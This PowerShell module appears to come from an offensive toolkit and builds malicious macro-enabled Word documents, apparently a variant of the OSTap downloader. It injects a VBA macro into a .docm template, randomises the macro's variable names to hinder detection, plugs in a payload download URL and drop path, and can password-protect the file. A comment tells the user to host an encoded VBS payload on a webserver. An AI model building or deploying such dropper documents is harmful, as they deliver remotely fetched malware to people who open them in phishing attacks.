Import-Module $PSScriptRoot\..\..\internals\utils.psm1
Import-Module $PSScriptRoot\..\..\internals\tools.psm1

<#

This module is a variant of OSTap where it utilizes encoded VBS for code execution

use the included "encode.vbs" and "decode.vbs" scripts to generate your payloads

they require a VBS file to be fed in for either the encoding/decoding routine

additionaly, ensure that your encoded payload is stored on a webserver somewhere

#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false

    $fname = "$PSScriptRoot\Doc1.docm"

    $wdDoc = $wdApp.documents.open($fname)

    $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)

    $macro = BuildMacro
    $vbaModule.CodeModule.AddFromString($macro) | Out-Null

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    } 

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {

    $macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")
    [string[]]$payload = Get-Content -Path "$PSScriptRoot\payloads.txt"

    $var_counter = 1
    do {
        $this_var_name = "aVAR" + $var_counter + "a"
        $randName = RandTextAlpha -len 15
        if ($macro.contains($this_var_name)) {
            $macro = $macro -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    # download URL
    $macro = $macro -replace "aPAYLOAD1a", $payload[0]

    # drop TO
    $macro = $macro -replace "aPAYLOAD2a", $payload[1]

    return $macro

}